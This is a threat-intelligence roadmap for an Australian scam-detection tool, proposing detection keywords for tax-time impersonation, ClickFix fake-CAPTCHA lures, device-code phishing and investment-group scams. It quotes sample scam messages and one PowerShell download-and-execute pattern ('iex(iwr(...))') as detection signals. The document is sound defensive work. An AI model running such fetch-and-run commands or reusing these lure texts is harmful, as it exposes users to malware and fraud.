# Threat Intelligence Roadmap — 2026-07-05

> **Weekly brief for Just Checking, Mate**
> Detection code lives in `lib/`. This file is research-and-proposals only — no `lib/` files are modified here.
> Previous roadmap: `docs/threat-intel/2026-07-01-threat-roadmap.md` (all D1–D13 from that run are now implemented; issues #63–#68 closed).

---

## (a) Executive Summary — Top 5 Ship-This-Week Changes

Ranked by **impact × ease** (all are string/regex additions to existing functions — no architecture changes required):

| # | Recommendation | Why now |
|---|---|---|
| 1 | **Add ATO/myGov tax-time cost-of-living lure phrases** to `URGENCY_WORDS` | Peak AU tax scam season (July 1 = new tax year); myGov scam search volume increased 10× (April → May 2026); "cost of living payment", "energy rebate", "compensation payment" lures are the active hook but not in any keyword list |
| 2 | **Detect ClickFix "run a command" social engineering** — add "press windows+r", "ctrl+v", "paste this command", "run this to verify" to `checkSms` / `checkCustom` | ACSC issued a specific advisory (7 May 2026); active campaign against AU infrastructure using compromised WordPress sites; **zero existing coverage**; FP risk is essentially zero — no legitimate message ever asks you to press Win+R |
| 3 | **Add device code / OAuth token phishing language** to `checkEmail` | Escalated from MEDIUM watchlist (July 1 roadmap) to HIGH: FBI PSA260521 (21 May 2026), Tycoon2FA operators adopted this post-takedown; 340+ AU orgs confirmed compromised; "enter device code" / "microsoft.com/devicelogin" in an email is a high-confidence scam signal |
| 4 | **Add WhatsApp investment group recruitment lures** to the pig-butchering composite | ASIC joint alert with NASC (May 2026): WhatsApp "share trading" groups are the new pig-butchering entry vector; existing `jobSignals` covers task/product-rating lures but **not** the investment tip group variant |
| 5 | **Add `.zip`, `.mov`, `.lat` to `SUSPICIOUS_TLDS`** | `.zip`/`.mov` are file-extension TLDs that bypass user intuition and many URL scanners; `.lat` is an actively abused Latin-script TLD; trivial list addition; no architecture change |

---

## (b) New / Evolved Threats This Week

### T1. Tax-Time Cost-of-Living Impersonation (ATO / myGov / Medicare) [HIGH — AU-specific, seasonal peak NOW]

**What:** It is now the start of the 2025-26 Australian tax year (July 1 marks lodgement season). The ATO/ACCC/Scamwatch annually warn of a tax-scam spike in July–August. In 2026, scammers are exploiting real government cost-of-living policies — one-off energy rebates, cost-of-living supplements, and tax-recalculation notices — as lures. The specific lure phrases have evolved beyond the generic "refund" or "debt notice" patterns already in the codebase.

**Novel lure phrases not yet in `URGENCY_WORDS` or `REQUEST_WORDS`:**
- "cost of living payment" / "cost of living relief" / "cost-of-living supplement"
- "energy rebate" / "energy bill relief" / "electricity rebate"
- "tax recalculation" / "your tax has been recalculated" / "compensation payment"
- "myid verification" / "myID account" — the new myGov digital identity layer is rebranding to **myID** in 2026; scammers will follow immediately

**Why this is new:** The prior URGENCY_WORDS list covered "account suspended", "security alert", "unusual activity" — generic urgency. The 2026 variants use *named government benefit programme language* to appear more convincing. Searches for "MyGov scam" spiked 10× from April to May 2026 (50/month → 660/month).

**Key detection rule (free signal):** ATO, myGov, Medicare, and Centrelink have all officially removed clickable hyperlinks from unsolicited SMS since 2024. Any SMS claiming to be from these bodies that contains a link is definitionally a scam — this is worth surfacing as an explicit flag in `checkSms()` when govMentions + URL pattern co-occur.

**AU relevance:** 100% AU-specific. ATO impersonation reports increased 11% month-on-month in May 2026. Peak scam season runs July–September.

**Example IOC messages:**
- `"myGov: A $750 cost of living payment is waiting for you. Verify your details to claim: [link]"`
- `"ATO: Your 2024-25 tax return has been recalculated. You are owed a $1,240 refund. Confirm via: [link]"`
- `"Centrelink: You may be eligible for an energy rebate. Click here to check your eligibility: [link]"`

**Sources:**
- https://www.scamwatch.gov.au/about-us/news-and-alerts/australian-taxation-office-ato-and-mygov-impersonation-scams
- https://my.gov.au/en/about/privacy-and-security/mygov-scams
- https://www.ato.gov.au/online-services/scams-cyber-safety-and-identity-protection/scam-alerts
- https://thekalculators.com.au/tax-scams-and-how-to-avoid-them/
- https://nationalseniors.com.au/news/finance/scammers-are-coming-for-your-tax-return

---

### T2. ClickFix — Fake CAPTCHA + "Run a Command" Social Engineering [HIGH — AU-targeted, ACSC advisory]

**What:** ClickFix is a social engineering technique (named by Proofpoint, 2024; now industrialised globally) in which compromised websites display a fake Cloudflare CAPTCHA or "verify you are human" overlay. The overlay instructs the user to:

1. Press **Windows + R** (open Run dialog)
2. Press **Ctrl + V** (paste — malicious JavaScript has already copied a PowerShell command to clipboard)
3. Press **Enter** (execute the command)

The PowerShell command downloads and installs **Vidar Stealer** malware (or other payloads), harvesting browser cookies, passwords, and crypto wallet data.

**ACSC advisory:** The ASD's ACSC issued a dedicated alert on **7 May 2026** (confirmed active since early 2026) targeting Australian organisations across multiple sectors. The campaign uses **compromised WordPress sites belonging to legitimate Australian businesses** as the delivery vector — making URL-based detection unreliable.

**Why this requires text-side detection:** The compromised page's prompt language is the only detectable signal when a user pastes the text they saw into the checker. No legitimate website or message ever asks a user to press Win+R and paste a command to "verify" their humanity.

**Text signals NOT currently in codebase:**
- "press windows+r" / "press win+r" / "windows run"
- "ctrl+v then enter" / "ctrl v enter" / "press ctrl and v"
- "paste this command" / "paste the following command" / "copy and paste this"
- "run this to verify" / "run the following to verify" / "run this fix"
- "open run dialog" / "open terminal and paste"
- "verify you are human" + instruction to execute something (composite)

**IOCs / patterns:**
- Fake Cloudflare overlay text: "Verifying you are human... Please complete the following verification"
- PowerShell command structure: `powershell -c "iex(iwr('https://...'))"` — the command itself is a strong signal if pasted
- Infrastructure: the *delivery* site is a legitimate WordPress site; the *payload* server uses short-lived domains on `.xyz`, `.top`, `.cfd` (already in SUSPICIOUS_TLDS)

**AU relevance:** Confirmed AU campaign. Sectors targeted include healthcare, financial services, professional services, and SMBs operating WordPress sites.

**Sources:**
- https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/clickfix-distributing-vidar-stealer-via-wordpress-targeting-australian-infrastructure
- https://securityboulevard.com/2026/05/australia-warns-of-clickfix-attacks-pushing-vidar-stealer-malware/
- https://channellife.com.au/story/australian-businesses-warned-over-clickfix-attacks
- https://www.itnews.com.au/news/clickfix-attack-tricks-users-into-hacking-themselves-acsc-warns-625692
- https://thehackernews.com/2026/07/researcher-analyzes-3000-live-clickfix.html

---

### T3. Device Code / OAuth Token Phishing — Escalated to HIGH [HIGH — AU organisations confirmed; FBI advisory]

**What:** Noted as a watchlist item in the July 1 roadmap (T7 / D9 MEDIUM). **Escalated this week** to HIGH following:
- FBI IC3 advisory **PSA260521** (21 May 2026) warning of "Kali365" — an OAuth device code PhaaS kit sold via Telegram for ~$250/month
- Tycoon2FA operators (disrupted March 2026) pivoting to this technique to replace their previous AiTM infrastructure
- Confirmed Australian organisations in the financial services and healthcare sectors affected

**How it works:** The legitimate **OAuth 2.0 Device Authorization Grant** flow (RFC 8628, designed for Smart TVs and input-constrained devices) is being weaponised. The attacker initiates a Microsoft 365 login, generates a device code, then sends an email telling the victim to visit `microsoft.com/devicelogin` and enter the code. The victim performs this action on a **legitimate Microsoft page** — no fake site — but unknowingly authorises the attacker's session. The refresh token persists for weeks and **survives password resets**.

**Consumer-side detection opportunity:** The lure email contains distinctive language. No legitimate service sends an unprompted email asking you to enter a code at `microsoft.com/devicelogin`.

**Text signals NOT in codebase:**
- "enter this device code" / "enter device code" / "your device code is"
- "microsoft.com/devicelogin" (legitimate URL, illegitimate context)
- "visit microsoft.com and enter" / "go to microsoft.com/devicelogin"
- "device authorization code" / "activate your device" (email context)
- "device verification required" / "new device sign-in code"

**IOC patterns:**
- Subject lines: "Microsoft: New Device Sign-In", "Action Required: Verify New Device", "Microsoft 365: Authorise New Device Access"
- Body URLs: `microsoft.com/devicelogin` (legitimate — make the flag educational, not a block)
- Infrastructure: Starkiller/EvilTokens kits route captured sessions via `*.railway.app` and `*.workers.dev` (already flagged in `SUSPICIOUS_HOSTING`)

**AU relevance:** 340+ organisations globally confirmed compromised March 2026; AU financial services and healthcare in scope. ABA (Australian Banking Association) issued guidance to member banks in April 2026.

**Sources:**
- https://thehackernews.com/2026/03/device-code-phishing-hits-340-microsoft.html
- https://www.microsoft.com/en-us/security/blog/2026/04/06/ai-enabled-device-code-phishing-campaign-april-2026/
- https://dev.to/iamdevbox/aitm-phishing-2026-how-starkiller-and-tycoon-2fa-bypass-your-mfa-3igd
- https://spycloud.com/blog/device-code-phishing-the-new-aitm-attack-bypassing-mfa/

---

### T4. WhatsApp Investment Group Pig-Butchering (ASIC / NASC Joint Alert) [HIGH — new AU-specific entry vector]

**What:** ASIC issued a consumer alert (published **late May 2026**, media release 26-063MR) jointly with the National Anti-Scam Centre warning that scammers are recruiting victims via **WhatsApp "share trading" and "stock tips" groups**. This is a distinct evolution of the pig-butchering pattern already in the codebase — the existing `jobSignals` composite detects the *task/product-rating* entry funnel, but the *investment tip group* variant uses completely different language.

**How it works:**
1. Scammer sends a cold WhatsApp message: "I got your number from [LinkedIn/mutual contact/a trading forum]"
2. Victim is invited into a "private stock tips group" or "VIP trading signal channel"
3. Over days/weeks, fake "wins" are demonstrated to build trust
4. Victim is invited to deposit on a "exclusive" crypto trading platform (fake dashboard showing inflated returns)
5. When victim tries to withdraw, they're told to pay an "unlocking fee" — which goes directly to scammers
6. ASIC and the AFP separately shut down 95 shell companies linked to these platforms

**In 2026, agentic AI** automates step 1–3, maintaining thousands of simultaneous "relationships" with synthetic personas.

**Text signals NOT in codebase:**
- "join our trading group" / "join our stock tips group" / "join our investment group"
- "exclusive stock tips" / "exclusive trading signals" / "vip trading signals"
- "private investment group" / "private trading group" / "members-only trading"
- "we made $X this week from tips" / "our group returned X% last month"
- "insider trading tips" (note: this phrase is also used to recruit, as scammers exploit the allure of insider information)
- "i'll add you to our whatsapp group"

**Distinction from current pig-butchering composite (`jobSignals`):** Current detection requires ≥2 of: rate products, simple tasks, earn $X, no experience required, online tasks, work from home. The investment group variant has zero overlap with these phrases.

**IOCs / patterns:**
- Platform domains: short-lived `.xyz`, `.top`, `.icu` domains with names like `tradingsignals-au[.]xyz`, `cryptoprofits-group[.]icu` (already scored high via TLD rules)
- WhatsApp recruitment message: "Hi, I think you might be interested in my trading group. We've been consistently profitable. Let me add you in?"

**AU relevance:** ASIC/NASC joint alert; 95 shell companies shut down in AU; losses exceeding AUD $35.8M from this variant alone.

**Sources:**
- https://www.asic.gov.au/about-asic/news-centre/news-items/scam-alert-scammers-luring-investors-onto-fake-crypto-asset-trading-platforms/
- https://www.asic.gov.au/about-asic/news-centre/find-a-media-release/2026-releases/26-063mr-asic-ramps-up-action-to-protect-consumers-from-ai-powered-online-investment-scams/
- https://www.cryptotimes.io/2026/05/26/australias-asic-exposes-crypto-scams-flooding-social-media-feeds/
- https://coingeek.com/australia-warns-of-crypto-investment-scams-on-messaging-apps/

---

### T5. New Abused TLDs: .zip, .mov, .lat [MEDIUM — easy detection improvement]

**What:** Three TLDs not currently in `SUSPICIOUS_TLDS` have measurable phishing abuse:

- **`.zip`** (Google-released May 2023): Looks identical to a ZIP file extension. Browsers, messaging apps, and email clients in many configurations auto-link text like `"download-update.zip"` as a URL pointing to the malicious `.zip` domain. Phishing uses it to embed fake "invoice" or "document" links in messages.
- **`.mov`** (Google-released May 2023): Same issue — auto-linked as if it were a video file. Used in lures claiming to be "video messages" from banks or government.
- **`.lat`** (Latin-script TLD, heavily abused since late 2025): Appears in several major phishing-kit blocklists; high scam-to-legitimate ratio. Used in fake government and financial services pages targeting Spanish and Portuguese-speaking communities, but increasingly in English-language AU-targeting campaigns.

**Detectability:** Adding to `SUSPICIOUS_TLDS` in `checkUrl()` requires a single line each; the existing `tldMatch` check catches them automatically.

**FP risk:** 
- `.zip` and `.mov`: Low-Medium for URL context; no AU consumer service uses these TLDs for anything legitimate
- `.lat`: Low; not used by any significant AU legitimate service

**Sources:**
- https://bolster.ai/blog/zip-domain-phishing-and-mov-malware
- https://fieldeffect.com/blog/what-you-should-know-about-the-new-.zip-and-.mov-tlds
- https://socradar.io/blog/top-10-tlds-threat-actors-use-for-phishing/
- https://www.cybercrimeinfocenter.org/top-20-tlds-by-malicious-phishing-domains

---

### T6. SMS Sender ID "Unverified" Label — Scammer Override Language [MEDIUM — 1 July 2026 context change]

**What:** The ACMA **SMS Sender ID Register** went live on **1 July 2026**. From this date, legitimate AU businesses using alphanumeric sender IDs (e.g. "NAB", "ATO", "Linkt") must register those IDs. Unregistered IDs are displayed to recipients as **"[SenderName] — Unverified"** in a distinct thread.

**Two new detection opportunities:**

1. **Scammer override language:** Some scammers are pre-emptively embedding explanatory text to neutralise user suspicion about the "Unverified" label:
   - "This message may appear as 'Unverified' due to our carrier update — this is normal"
   - "Our Sender ID is registered but carrier display may lag by 24–48 hours"
   - "Ignore any 'Unverified' warning — this is a system limitation"
   
2. **Numeric-only sender ID bypass:** The ACMA regime only covers *alphanumeric* IDs. Scammers in the UK shifted to numeric-only sender IDs when Ofcom's equivalent scheme launched. Numeric IDs (e.g. `+61412345678`) are not labelled "Unverified" even if the number is spoofed. This is not a text signal but a context note for future phone-checker enhancement.

**Text signals for override language (not in codebase):**
- "may appear unverified" / "displayed as unverified" / "shown as unverified"
- "ignore the unverified" / "ignore the 'unverified' warning"
- "carrier has not updated" / "registration lag" (in context of explaining a message label)

**AU relevance:** Australia-specific. The ACMA regime is unique to Australia and came into force this week.

**Sources:**
- https://www.acma.gov.au/articles/2026-06/sms-sender-id-register-goes-live-help-protect-australians-scams
- https://www.acma.gov.au/sms-sender-id-register
- https://www.prospa.com/blog/new-sms-sender-id-rules-from-1-july-2026-what-small-businesses-need-to-know/
- https://stateofsurveillance.org/news/australia-sms-sender-id-registration-acma-2026/

---

### T7. Deepfake Celebrity Investment Bait — Text Signals [MEDIUM — carried from July 1 watchlist]

**What:** D10 from the July 1 roadmap (MEDIUM, not implemented). Still very active: WA Government reported $30M in losses from "celebrity fakes and crypto cons"; CommBank found 27% of Australians had encountered a deepfake scam in the past year. ASIC's AI-powered investment scam crackdown (26-063MR) specifically called out deepfake celebrity endorsement as a key recruitment vector.

**Key new text signal:** Scammers now use a specific phrase to falsely claim ASIC validation — **"verified by asic"** / **"asic-registered platform"** / **"asic approved"**. The real ASIC never validates individual investment platforms this way; this phrasing is essentially zero-FP.

**Text signals not in codebase:**
- "guaranteed returns" / "guaranteed profit" / "guaranteed investment returns"
- "risk-free investment" / "risk-free returns"
- "double your money" / "triple your investment"
- "verified by asic" / "asic-approved platform" / "asic-registered investment"
- "exclusive investment opportunity" / "early access investment platform"
- "as seen on channel 7" / "as seen on tv" / "celebrity-backed" (lower specificity)

**Sources:**
- https://www.asic.gov.au/about-asic/news-centre/find-a-media-release/2026-releases/26-063mr-asic-ramps-up-action-to-protect-consumers-from-ai-powered-online-investment-scams/
- https://www.commbank.com.au/articles/newsroom/2026/01/can-australians-spot-deepfake-scams.html
- https://www.wa.gov.au/government/announcements/celebrity-fakes-and-crypto-cons-drive-30m-loss-investment-scams

---

### T8. Fake Banking App Reinstallation Lure [MEDIUM — new RAT-delivery variant]

**What:** A new variant of the Remote Access Tool delivery scam (partially covered by existing "download software" / "install software" signals): scammers impersonate bank fraud teams via call or SMS, claim the victim's banking app is "infected with malware", and instruct them to delete the real app and download a "secure replacement" from a link. The replacement is malware. Kaspersky reported the "Rokarolla" Android banking trojan spreading via this method in June 2026.

**Distinction from current coverage:** `REQUEST_WORDS` already contains `"download software"`, `"install software"`, `"remote access"`. This variant is *banking-app specific* — it adds credibility by:
1. Referencing the victim's actual bank by name (uses impersonation + "your app is compromised" language)
2. Directing to a URL that mimics the bank's official domain (already caught by `auBrands` + `checkUrl`)
3. Using phrases that bypass the "install from unknown sources" suspicion: "secure banking portal", "verified download"

**New phrases not in codebase:**
- "delete your banking app" / "uninstall your bank app"
- "reinstall from this secure link" / "download the secure version"
- "your banking app has been compromised" / "your banking app is infected"
- "verified bank download" / "official secure download portal"

**Sources:**
- https://www.malwarebytes.com/blog/mobile/2026/06/rokarolla-android-malware-can-take-over-your-phone-and-steal-banking-logins
- https://www.kaspersky.com/blog/growing-2026-android-threats-and-protection/55191/
- https://www.afp.gov.au/news-centre/media-release/banks-dont-rush-scammers-do-callous-impersonation-scams-robbing-everyday

---

## (c) Proposed Detection Improvements

| # | Tactic | Proposed Rule | Target File | FP Risk | Priority |
|---|--------|---------------|-------------|---------|----------|
| D1 | Tax-time cost-of-living lures | Add to `URGENCY_WORDS` (new sub-group `URGENCY_TAXTIME`): `"cost of living payment"`, `"cost of living relief"`, `"energy rebate"`, `"energy bill relief"`, `"electricity rebate"`, `"tax recalculation"`, `"compensation payment"`, `"government rebate"` | `lib/scamDetector.ts` | Medium — phrases appear in legitimate gov comms; the compound scorer (URL + gov mention + these terms) keeps FP rate acceptable | HIGH |
| D2 | myID rebrand impersonation | Add `"myid"`, `"my id app"` to `govMentions` in `checkSms()` and to `LEGIT_AU_DOMAINS` exception list for `"my.gov.au"` / `"myid.gov.au"` | `lib/scamDetector.ts` | Low — "myid" is highly specific to the new myGov digital identity layer | HIGH |
| D3 | ClickFix "run a command" prompts | Add to `REQUEST_WORDS` (new sub-group `REQUEST_CLICKFIX`): `"press windows+r"`, `"press win+r"`, `"ctrl+v then enter"`, `"paste this command"`, `"paste the following command"`, `"run this to verify"`, `"open run dialog"`, `"copy and paste this fix"`. Optionally add regex to `checkSms`/`checkCustom`: `/press\s+(win|windows)\s*\+?\s*r/i` | `lib/scamDetector.ts` | Very low — no legitimate message ever instructs a user to press Win+R. High score (+40) is appropriate | HIGH |
| D4 | Device code / OAuth phishing | Add to `checkEmail()` a new regex block (not in `REQUEST_WORDS` flat list, as it's email-specific): detect `"enter.*device code"`, `"your device code is"`, `"microsoft\.com\/devicelogin"`, `"device authorization code"`, `"activate.*new device"`. Flag: `"Device code phishing — scammers abuse Microsoft's OAuth device login flow to steal account access without a fake login page"` (+30) | `lib/scamDetector.ts` | Low — `microsoft.com/devicelogin` appearing as a call-to-action in an unexpected email is a near-zero FP signal | HIGH |
| D5 | WhatsApp investment group recruitment | Add ≥2-signal composite to `checkSms` (extend existing `jobSignals`-style logic or add a parallel `investmentGroupSignals` composite): `"join.*trading group"`, `"stock tips group"`, `"trading signals"`, `"vip.*trading"`, `"exclusive.*investment.*group"`, `"private.*trading.*group"`. Require ≥2 hits OR 1 hit + existing crypto/wallet signal | `lib/scamDetector.ts` | Medium for individual signals; composite requirement reduces FP substantially | HIGH |
| D6 | New suspicious TLDs | Add to `SUSPICIOUS_TLDS`: `".zip"`, `".mov"`, `".lat"` | `lib/scamDetector.ts` | Low-Medium (.zip/.mov: virtually no legitimate AU consumer service uses these); Low (.lat) | HIGH |
| D7 | SMS "Unverified" label override language | Add to `URGENCY_WORDS` or a new composite: `"may appear unverified"`, `"displayed as unverified"`, `"ignore the unverified"`, `"ignore the 'unverified' warning"`, `"carrier has not updated our registration"`. Flag: `"Message asks you to ignore an 'Unverified' sender label — since 1 July 2026, legitimate AU senders must register their ID with ACMA. This is almost certainly a scam."` (+30) | `lib/scamDetector.ts` | Very low — no legitimate sender needs to explain away an "Unverified" display label | MEDIUM |
| D8 | Deepfake investment bait — "verified by ASIC" | Add to `REWARD_WORDS`: `"guaranteed returns"`, `"guaranteed profit"`, `"risk-free investment"`, `"double your money"`. Add to `REQUEST_WORDS` (near-zero FP): `"verified by asic"`, `"asic-approved platform"`, `"asic registered investment"` | `lib/scamDetector.ts` | Medium for "guaranteed returns" alone; near-zero for "verified by asic" (ASIC never endorses individual platforms this way) | MEDIUM |
| D9 | Fake banking app reinstallation | Add to `REQUEST_WORDS`: `"delete your banking app"`, `"reinstall your bank app"`, `"your banking app has been compromised"`, `"your banking app is infected"`, `"download the secure bank app"`, `"verified bank download"` | `lib/scamDetector.ts` | Low — banks never instruct customers to delete/reinstall apps via SMS; these phrases are zero legitimate use | MEDIUM |
| D10 | gov mention + URL = no-link policy flag | In `checkSms()`, if `govMentions` fires AND a URL is detected in the same message, add an additional explicit flag: `"ATO, myGov, Medicare, Australia Post, and Linkt have officially removed links from their SMS messages since 2024 — any SMS from these bodies containing a link is a scam"` (+15) | `lib/scamDetector.ts` | Very low — informational clarification that stacks on existing score, no standalone trigger | MEDIUM |

---

## (d) Lower-Priority / Watchlist Items

- **Numeric-only sender ID bypass (post-ACMA):** The ACMA regime covers alphanumeric IDs only. Scammers shifting to numeric spoofing (which displays like a real phone number, not a brand name) means a previously flagged "Linkt" sender-name clue is no longer available. No code change possible until the regime is extended; document for awareness.

- **International SMS routing into AU (post-ACMA bypass):** Non-Australian carriers are not bound by ACMA's SMS Sender ID Register. A scam SMS sent via a foreign gateway bypasses the "Unverified" label entirely. Watch for increased abuse of +64 (NZ), +852 (HK), and +1 (US/CA) routing for AU-targeted smishing.

- **MyID phishing domain watch:** As myGov migrates to `myid.gov.au`, watch for typosquats: `myid-verify[.]com.au`, `myid-login[.]top`, etc. The existing `auBrands` typosquatting check may not catch "myid" as a brand keyword — add it when the migration is confirmed (D2 above handles the `govMentions` side).

- **AI-generated agentic pig-butchering (grammar signal deprecation):** Criminal groups using agentic AI for mass relationship-building produce grammatically flawless messages, eroding the value of the existing typo-detection signal (`typos` match in `checkSms()`). This is not a reason to remove it (some lower-sophistication actors still make errors), but confidence in "no typos = more legit" should be reduced. Consider lowering the negative-weight benefit of no typo matches in future.

- **Fake IPTV / streaming app malware lure:** Kaspersky reports (2026) that Vidar Stealer and similar payloads are also distributed via fake IPTV/streaming apps in AU. Detection opportunity: SMS lures claiming "your streaming service has been compromised" with a link. Not yet at AU-specific volume to warrant a rule; watchlist.

- **Calendar/cloud-document phishing:** Google's June 2026 fraud advisory notes attackers injecting fake renewal notices into Google Calendar invites or hiding malicious instructions in legitimate Google Docs/SharePoint files. These are enterprise-focused; no text-side signal available for the current consumer-facing checker. Watchlist only.

- **SIM-swap follow-on scams:** AFP and banks report SIM-swap fraud rising in AU as the ACMA registry makes SMS-based impersonation harder. A SIM-swap followed by bank 2FA interception is entirely a carrier-level event; no text signal. Watchlist.

---

## (e) Full Source List

1. Scamwatch — ATO and myGov impersonation scams: https://www.scamwatch.gov.au/about-us/news-and-alerts/australian-taxation-office-ato-and-mygov-impersonation-scams
2. myGov — myGov scams: https://my.gov.au/en/about/privacy-and-security/mygov-scams
3. ATO — Scam alerts: https://www.ato.gov.au/online-services/scams-cyber-safety-and-identity-protection/scam-alerts
4. The Kalculators — Tax scams AU 2025-26: https://thekalculators.com.au/tax-scams-and-how-to-avoid-them/
5. National Seniors AU — Tax return scammers: https://nationalseniors.com.au/news/finance/scammers-are-coming-for-your-tax-return
6. Cyber.gov.au — ClickFix Vidar Stealer advisory: https://www.cyber.gov.au/about-us/view-all-content/alerts-and-advisories/clickfix-distributing-vidar-stealer-via-wordpress-targeting-australian-infrastructure
7. Security Boulevard — Australia ClickFix Vidar Stealer warning: https://securityboulevard.com/2026/05/australia-warns-of-clickfix-attacks-pushing-vidar-stealer-malware/
8. Channel Life AU — Australian businesses warned over ClickFix: https://channellife.com.au/story/australian-businesses-warned-over-clickfix-attacks
9. iTnews — ClickFix ACSC warning: https://www.itnews.com.au/news/clickfix-attack-tricks-users-into-hacking-themselves-acsc-warns-625692
10. The Hacker News — ClickFix 3,000 live payloads: https://thehackernews.com/2026/07/researcher-analyzes-3000-live-clickfix.html
11. BitDefender — ClickFix WordPress Vidar AU: https://www.bitdefender.com/en-us/blog/hotforsecurity/clickfix-compromised-wordpress-sites-vidar-stealer-australia
12. The Hacker News — Device code phishing 340 orgs: https://thehackernews.com/2026/03/device-code-phishing-hits-340-microsoft.html
13. Microsoft Security Blog — AI-enabled device code phishing (April 2026): https://www.microsoft.com/en-us/security/blog/2026/04/06/ai-enabled-device-code-phishing-campaign-april-2026/
14. DEV Community — Starkiller and Tycoon 2FA MFA bypass: https://dev.to/iamdevbox/aitm-phishing-2026-how-starkiller-and-tycoon-2fa-bypass-your-mfa-3igd
15. SpyCloud — Device code phishing new AiTM: https://spycloud.com/blog/device-code-phishing-the-new-aitm-attack-bypassing-mfa/
16. IC3 — Kali365 PSA260521: https://www.ic3.gov/CSA/2026/260108.pdf
17. ASIC — Fake crypto trading platforms alert: https://www.asic.gov.au/about-asic/news-centre/news-items/scam-alert-scammers-luring-investors-onto-fake-crypto-asset-trading-platforms/
18. ASIC — Media release 26-063MR AI-powered investment scams: https://www.asic.gov.au/about-asic/news-centre/find-a-media-release/2026-releases/26-063mr-asic-ramps-up-action-to-protect-consumers-from-ai-powered-online-investment-scams/
19. Crypto Times — ASIC exposes crypto scams social media: https://www.cryptotimes.io/2026/05/26/australias-asic-exposes-crypto-scams-flooding-social-media-feeds/
20. CoinGeek — Australia warns crypto investment scams messaging apps: https://coingeek.com/australia-warns-of-crypto-investment-scams-on-messaging-apps/
21. Bolster.ai — .zip and .mov domain phishing: https://bolster.ai/blog/zip-domain-phishing-and-mov-malware
22. Field Effect — .zip and .mov TLDs: https://fieldeffect.com/blog/what-you-should-know-about-the-new-.zip-and-.mov-tlds
23. SOCRadar — Top 10 phishing TLDs: https://socradar.io/blog/top-10-tlds-threat-actors-use-for-phishing/
24. Cybercrime Information Center — Top 20 TLDs by malicious phishing domains: https://www.cybercrimeinfocenter.org/top-20-tlds-by-malicious-phishing-domains
25. ACMA — SMS Sender ID Register live: https://www.acma.gov.au/articles/2026-06/sms-sender-id-register-goes-live-help-protect-australians-scams
26. ACMA — SMS Sender ID Register: https://www.acma.gov.au/sms-sender-id-register
27. Prospa — New SMS sender ID rules July 2026: https://www.prospa.com/blog/new-sms-sender-id-rules-from-1-july-2026-what-small-businesses-need-to-know/
28. State of Surveillance — ACMA SMS Sender ID: https://stateofsurveillance.org/news/australia-sms-sender-id-registration-acma-2026/
29. CommBank — Can Australians spot deepfakes: https://www.commbank.com.au/articles/newsroom/2026/01/can-australians-spot-deepfake-scams.html
30. WA Government — Celebrity fakes crypto $30M: https://www.wa.gov.au/government/announcements/celebrity-fakes-and-crypto-cons-drive-30m-loss-investment-scams
31. Malwarebytes — Rokarolla Android banking malware: https://www.malwarebytes.com/blog/mobile/2026/06/rokarolla-android-malware-can-take-over-your-phone-and-steal-banking-logins
32. Kaspersky — Growing 2026 Android threats: https://www.kaspersky.com/blog/growing-2026-android-threats-and-protection/55191/
33. AFP — Banks don't rush, scammers do: https://www.afp.gov.au/news-centre/media-release/banks-dont-rush-scammers-do-callous-impersonation-scams-robbing-everyday
34. Google — June 2026 fraud and scams advisory: https://blog.google/innovation-and-ai/technology/safety-security/fraud-scams-advisory-june-2026/
35. TechRadar — Scams in Australia June 2026: https://www.techradar.com/computing/cyber-security/scams-in-australia
36. Pickr — Fake toll SMS phishing ramps up 2026: https://www.pickr.com.au/news/2026/fake-toll-sms-phishing-ramps-up-how-to-tell/
37. Jim's IT — Australia Post, Linkt, MyGov scam text guide 2026: https://jimsit.com.au/scam-text-australia-post-linkt-mygov/

---

## Issues to Open Manually

> The following 6 HIGH-priority issues should be created in GitHub.
> Labels to apply: `threat-intel` (if it exists in the repo).

---

### Issue A: [threat-intel] Add tax-time cost-of-living lure keywords to URGENCY_WORDS (ATO/myGov peak season)

**Body:**

**Summary:** It is now the start of the Australian 2025-26 tax year and peak ATO/myGov scam season. ATO impersonation reports spiked 11% month-on-month in May 2026, and searches for "MyGov scam" increased 10× from April to May 2026. Scammers are exploiting real government cost-of-living policies as lures — phrases not yet in the `URGENCY_WORDS` list.

**Proposed additions to `lib/scamDetector.ts` — add a new `URGENCY_TAXTIME` sub-group:**
```typescript
const URGENCY_TAXTIME = [
  "cost of living payment", "cost of living relief", "cost-of-living supplement",
  "energy rebate", "energy bill relief", "electricity rebate",
  "tax recalculation", "your tax has been recalculated", "compensation payment",
  "government rebate", "tax refund waiting", "refund is waiting",
];
```
Compose into `URGENCY_WORDS` (same pattern as `URGENCY_TOLL`, `URGENCY_PARCEL`, etc.)

**Also add to `govMentions` in `checkSms()`:** `"myid"` — the myGov digital identity layer is rebranding to "myID" in 2026; scammers will impersonate this immediately.

**Also consider:** In `checkSms()`, if a `govMentions` hit fires AND a URL is present, add an explicit flag: `"ATO, myGov, Medicare, and Australia Post have officially removed links from their unsolicited SMS messages since 2024 — any SMS from these bodies with a link is a scam."` (+15)

**False-positive risk:** Medium for phrases like "cost of living" alone (appears in legitimate government comms); the compound scorer (govMentions + URL + these terms) keeps FP acceptable.

**Example IOC messages:**
- `"myGov: A $750 cost of living payment is waiting. Verify your details: [link]"`
- `"ATO: Your 2024-25 tax return has been recalculated. You are owed $1,240. Confirm via: [link]"`

**Sources:**
- https://www.scamwatch.gov.au/about-us/news-and-alerts/australian-taxation-office-ato-and-mygov-impersonation-scams
- https://www.ato.gov.au/online-services/scams-cyber-safety-and-identity-protection/scam-alerts
- https://my.gov.au/en/about/privacy-and-security/mygov-scams

**Roadmap:** `docs/threat-intel/2026-07-05-threat-roadmap.md` (D1, D2, D10)

---

### Issue B: [threat-intel] Detect ClickFix "run a command" social engineering (fake CAPTCHA + PowerShell lure)

**Body:**

**Summary:** The ACSC issued a dedicated advisory on 7 May 2026 warning of an active campaign distributing Vidar Stealer via ClickFix — a technique that compromises legitimate WordPress sites, displays a fake Cloudflare CAPTCHA, and tricks users into pressing Win+R, pasting a PowerShell command from clipboard, and hitting Enter. The campaign has been active in Australia since early 2026 across multiple sectors. There is **zero existing coverage** in the detection codebase. FP risk is essentially nil — no legitimate website, SMS, or email ever asks a user to press Win+R and paste a command.

**Proposed additions to `lib/scamDetector.ts`:**

1. Add a new `REQUEST_CLICKFIX` sub-group to `REQUEST_WORDS`:
```typescript
const REQUEST_CLICKFIX = [
  "press windows+r", "press win+r", "press windows + r",
  "ctrl+v then enter", "ctrl v and enter",
  "paste this command", "paste the following command", "paste the command",
  "run this to verify", "run the following to verify", "run this fix",
  "open run dialog", "open the run dialog",
  "copy and paste this fix", "paste to fix",
];
```

